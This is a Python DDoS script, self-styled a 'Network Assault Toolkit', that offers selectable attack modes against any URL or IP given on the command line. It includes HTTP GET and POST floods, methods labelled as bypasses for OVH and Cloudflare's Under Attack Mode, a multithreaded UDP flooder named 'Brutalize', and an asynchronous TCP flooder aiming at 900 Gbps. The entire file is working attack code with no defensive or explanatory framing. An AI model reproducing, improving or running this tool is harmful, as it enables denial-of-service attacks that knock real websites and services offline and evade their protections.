import argparse
import requests
import threading
import time
import asyncio
import socket
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import cloudscraper

TARGET_GIGABITS_PER_SEC = 900
TOTAL_BYTES_PER_SEC = TARGET_GIGABITS_PER_SEC * 125_000_000  # Gigabits to bytes per second

DEFAULT_FORCE = 7812500000  # Adjust as needed based on practical packet size and system capability
DEFAULT_THREADS = 6000      # May need adjustment based on system and network capabilities

# Настройка логгирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Create a cloudscraper instance to bypass Cloudflare
scraper = cloudscraper.create_scraper()

# Banner with ASCII Art
banner = """
  __  __       _                            _           _               _ 
 |  \/  |     | |                          | |         | |             | |
 | \  / | ___ | |_ __ _ _ __ ___   ___  ___| |_ ___  ___| |_ ___  _ __ | |
 | |\/| |/ _ \| __/ _` | '_ ` _ \ / _ \/ __| __/ _ \/ __| __/ _ \| '_ \| |
 | |  | | (_) | || (_| | | | | | |  __/ (__| || (_) \__ \ || (_) | | | |_|
 |_|  |_|\___/ \__\__,_|_| |_| |_|\___|\___|\__\___/|___/\__\___/|_| |_(_)
                                                                            
              Network Assault Toolkit              
                       by @mvddarkovich
"""

def print_banner():
    """ Print the banner with animation effect """
    while True:
        print("\033[H\033[J", end="")  # Clear screen
        print(banner)
        time.sleep(1)  # Pause before clearing the screen
        print("\033[H\033[J", end="")  # Clear screen
        time.sleep(1)  # Pause before showing the banner again

# Start banner animation in a separate thread
banner_thread = threading.Thread(target=print_banner, daemon=True)
banner_thread.start()

# Attack methods for HTTP Layer 7
def get_flood(url, port, delay):
    while True:
        try:
            response = scraper.get(f"{url}:{port}")  # Use scraper for Cloudflare bypass
            logging.info(f"GET request to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in GET Flood: {e}")

def post_flood(url, port, delay):
    while True:
        try:
            response = scraper.post(f"{url}:{port}", data={'data': 'flood'})  # Use scraper for Cloudflare bypass
            logging.info(f"POST request to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in POST Flood: {e}")

def bypass_ovh(url, port, delay):
    while True:
        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            response = scraper.get(f"{url}:{port}", headers=headers)
            logging.info(f"OVH Bypass to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in OVH Bypass: {e}")

def random_hex(url, port, delay):
    while True:
        try:
            hex_path = '/'.join(['%x' % (i*10000) for i in range(1, 1000)])
            response = scraper.get(f"{url}:{port}/{hex_path}")
            logging.info(f"Random HEX to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in Random HEX: {e}")

def stomp(url, port, delay):
    while True:
        try:
            headers = {'X-Stomp': 'bypass'}
            response = scraper.get(f"{url}:{port}", headers=headers)
            logging.info(f"STOMP attack to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in STOMP attack: {e}")

def stress(url, port, delay):
    while True:
        try:
            response = scraper.get(f"{url}:{port}", headers={'Content-Length': '10000'})
            logging.info(f"STRESS attack to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in STRESS attack: {e}")

def cloudflare_bypass(url, port, delay):
    while True:
        try:
            response = scraper.get(f"{url}:{port}")  # Use scraper to bypass Cloudflare
            logging.info(f"Cloudflare Bypass to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in Cloudflare Bypass: {e}")

def cloudflare_uam_bypass(url, port, delay):
    while True:
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'cf-ray': 'bypass'}
            response = scraper.get(f"{url}:{port}", headers=headers)  # Use scraper to bypass Cloudflare UAM
            logging.info(f"Cloudflare Under Attack Mode Bypass to {url}:{port} returned {response.status_code}")
            time.sleep(delay)
        except requests.RequestException as e:
            logging.error(f"Error in Cloudflare UAM Bypass: {e}")

# UDP Flooder
class Brutalize:
    def __init__(self, ip, port, force=7812500000, threads=6000):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads

    def flood(self):
        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.send)
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()

    def send(self):
        target_addr = (self.ip, self.port)
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(self.force)
            while True:
                conn.sendto(data, target_addr)
        except Exception as e:
            logging.error("Error sending data:", e)
        finally:
            conn.close()

# TCP Load Tester
class TCPLoadTester:
    def __init__(self, target_ip, target_port, duration, payload_size, connections_per_thread):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.payload_size = payload_size
        self.payload = os.urandom(payload_size)
        self.interval = 1 / (TARGET_GIGABITS_PER_SEC * 125_000_000 / payload_size)
        self.connections_per_thread = connections_per_thread

    async def send_tcp_packet(self, writer):
        try:
            writer.write(self.payload)
            await writer.drain()
        except BrokenPipeError:
            logging.error("Broken pipe error: Connection closed unexpectedly by the other end")
            return False
        except Exception as e:
            logging.error(f"Error sending packet: {e}")
            return False
        return True

    async def worker(self):
        for attempt in range(20):  # Retry logic
            try:
                reader, writer = await asyncio.open_connection(self.target_ip, self.target_port)
                for _ in range(self.connections_per_thread):
                    success = await self.send_tcp_packet(writer)
                    if not success:
                        break  # Exit if a packet failed to send
                break  # Exit retry loop if successful
            except Exception as e:
                logging.error(f"Error establishing connection: {e}")
                await asyncio.sleep(1)  # Wait before retrying
            finally:
                if 'writer' in locals() and not writer.is_closing():
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except BrokenPipeError:
                        pass  # Ignore broken pipe errors on close
                    except Exception as e:
                        logging.error(f"Error closing connection: {e}")

    async def run(self):
        end_time = time.time() + self.duration
        while time.time() < end_time:
            await self.worker()
            await asyncio.sleep(self.interval)

async def run_test_instance(target_ip, target_port, duration, payload_size, connections_per_thread):
    tester = TCPLoadTester(target_ip, target_port, duration, payload_size, connections_per_thread)
    await tester.run()

async def main(target_ip, target_port, duration, payload_size, tcp_workers, connections_per_thread):
    tasks = [
        run_test_instance(target_ip, target_port, duration, payload_size, connections_per_thread)
        for _ in range(tcp_workers)
    ]
    await asyncio.gather(*tasks)

# Main function
def main_script():
    parser = argparse.ArgumentParser(description="Network Assault Toolkit - Layer 7 and Network Load Testing")
    parser.add_argument('method', choices=[
        'GET_FLOOD', 'POST_FLOOD', 'BYPASS_OVH', 'RANDOM_HEX', 'STOMP', 'STRESS', 
        'CLOUDFLARE_BYPASS', 'CLOUDFLARE_UAM_BYPASS', 'UDP_FLOOD', 'TCP_TEST'], 
        help='Attack method or test type')
    parser.add_argument('url', help='Target URL or IP address')
    parser.add_argument('--port', type=int, default=80, help='Port number for the target (default: 80)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests in seconds')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--duration', type=int, help='Duration of TCP test in seconds')
    parser.add_argument('--payload_size', type=int, help='Size of the payload in bytes for TCP test')
    parser.add_argument('--connections_per_thread', type=int, default=100, help='Number of TCP connections per thread')
    parser.add_argument('--udp_threads', type=int, default=500, help='Number of UDP threads')
    parser.add_argument('--tcp_workers', type=int, default=100, help='Number of TCP worker processes')

    args = parser.parse_args()

    if args.method in ['GET_FLOOD', 'POST_FLOOD', 'BYPASS_OVH', 'RANDOM_HEX', 'STOMP', 'STRESS', 'CLOUDFLARE_BYPASS', 'CLOUDFLARE_UAM_BYPASS']:
        attack_methods = {
            'GET_FLOOD': get_flood,
            'POST_FLOOD': post_flood,
            'BYPASS_OVH': bypass_ovh,
            'RANDOM_HEX': random_hex,
            'STOMP': stomp,
            'STRESS': stress,
            'CLOUDFLARE_BYPASS': cloudflare_bypass,
            'CLOUDFLARE_UAM_BYPASS': cloudflare_uam_bypass,
        }

        attack_method = attack_methods.get(args.method)
        if attack_method:
            logging.info(f"Starting {args.method} attack on {args.url}:{args.port} with {args.threads} threads and {args.delay} second delay.")
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = [executor.submit(attack_method, args.url, args.port, args.delay) for _ in range(args.threads)]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        logging.error(f"Error in thread execution: {e}")
        else:
            logging.error("Invalid method selected. Please choose a valid method.")

    elif args.method == 'UDP_FLOOD':
        udp_flooder = Brutalize(args.url, args.port, force=args.payload_size, threads=args.udp_threads)
        udp_thread = threading.Thread(target=udp_flooder.flood)
        udp_thread.start()
        udp_thread.join()

    elif args.method == 'TCP_TEST':
        if not args.duration or not args.payload_size:
            logging.error("For TCP_TEST, --duration and --payload_size must be specified.")
            return
        asyncio.run(main(args.url, args.port, args.duration, args.payload_size, args.tcp_workers, args.connections_per_thread))

if __name__ == "__main__":
    main_script()
